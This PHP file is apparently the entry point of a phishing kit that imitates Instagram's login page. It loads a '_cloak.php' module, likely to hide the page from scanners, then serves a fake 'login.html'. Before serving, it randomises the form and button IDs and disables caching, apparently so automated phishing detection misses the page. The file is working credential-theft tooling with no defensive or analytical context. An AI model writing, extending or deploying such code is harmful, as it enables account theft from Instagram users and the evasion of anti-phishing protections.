<?php
/**
 * Instagram entry point with cloaking
 */

$possible_paths = [
    __DIR__ . '/../../../.sites/_cloak.php',
    __DIR__ . '/../_cloak.php',
    __DIR__ . '/../../.sites/_cloak.php',
];

foreach ($possible_paths as $path) {
    if (file_exists($path)) {
        require_once $path;
        break;
    }
}

$html = file_get_contents(__DIR__ . '/login.html');
$suffix = substr(md5(time() . rand()), 0, 6);
$html = str_replace('id="ig-form"', 'id="ig-' . $suffix . '"', $html);
$html = str_replace('id="ig-btn"', 'id="btn-' . $suffix . '"', $html);

header('Cache-Control: no-cache, no-store, must-revalidate');
header('Pragma: no-cache');
header('Expires: 0');
header('Content-Type: text/html; charset=utf-8');
echo $html;
?>